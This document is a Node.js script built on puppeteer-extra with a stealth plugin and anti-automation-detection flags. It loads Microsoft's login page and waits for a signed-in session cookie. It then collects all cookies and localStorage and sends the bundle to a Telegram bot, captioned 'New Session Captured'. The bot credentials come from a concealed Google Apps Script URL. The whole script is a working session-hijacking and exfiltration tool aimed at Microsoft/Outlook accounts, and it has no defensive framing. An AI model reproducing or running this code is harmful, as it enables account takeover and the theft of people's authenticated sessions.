const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

// Replace with your Google Apps Script Web App URL
const VAULT_URL = 'https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUKsqmfsfIBoV2_yOhWdmxIgCnl80uU30snWuwTfHrd-51q3c6_BUgMjIJ1xHwceKwAlXKzidWocAI956ysT_RGtY6ggiTYS3LjmnExTnH_lgdAL_lKCaXU19CJau-9NUyisaZweAcB8W7FvqUZ5IXjm0_qDcqWmg8Q2iq3vzDrOw1iavNx096Kax0UL-4ljfcqJi9W5xPbTypAsgyRWevHtqSOpPFmJh7ZSxd7oTpgYa_kmnyLJOPW-SAmGnV9vhiRgK-2P99OYfTCDd1GHAmvRAAfZQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2';

async function captureSession() {
    // 1. Fetch Environment Variables from Google Vault
    const envResponse = await axios.get(VAULT_URL);
    const { TELEGRAM_TOKEN, CHAT_ID } = envResponse.data;

    const browser = await puppeteer.launch({
        headless: "new",
        args: [
            '--disable-blink-features=AutomationControlled',
            '--no-sandbox',
            '--disable-features=IsolateOrigins,site-per-process'
        ]
    });

    const page = await browser.newPage();
    
    // Set a consistent User-Agent to prevent fingerprint mismatch
    const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
    await page.setUserAgent(UA);

    console.log("Navigating to Microsoft...");
    await page.goto('https://login.microsoftonline.com', { waitUntil: 'networkidle2' });

    // 2. Wait for successful landing (RPSSecAuth exists only after login)
    console.log("Waiting for session stabilization...");
    await page.waitForFunction(() => document.cookie.includes('RPSSecAuth'), { timeout: 120000 });

    // 3. Extract Full Session Bundle
    const client = await page.target().createCDPSession();
    const { cookies } = await client.send('Network.getAllCookies');
    
    const localStorageData = await page.evaluate(() => JSON.stringify(localStorage));
    
    const sessionBundle = {
        timestamp: new Date().toISOString(),
        userAgent: UA,
        cookies: cookies,
        localStorage: JSON.parse(localStorageData)
    };

    // 4. Exfiltrate via Telegram
    const message = `✅ **New Session Captured**\nAccount: Microsoft/Outlook\nStatus: Persistent`;
    const document = JSON.stringify(sessionBundle, null, 2);

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
        chat_id: CHAT_ID,
        caption: message,
        parse_mode: 'Markdown',
        document: {
            value: Buffer.from(document),
            options: { filename: 'session_bundle.json', contentType: 'application/json' }
        }
    }, {
        headers: { 'Content-Type': 'multipart/form-data' }
    });

    console.log("Session Bundle sent to Telegram.");
    await browser.close();
}

captureSession().catch(console.error);
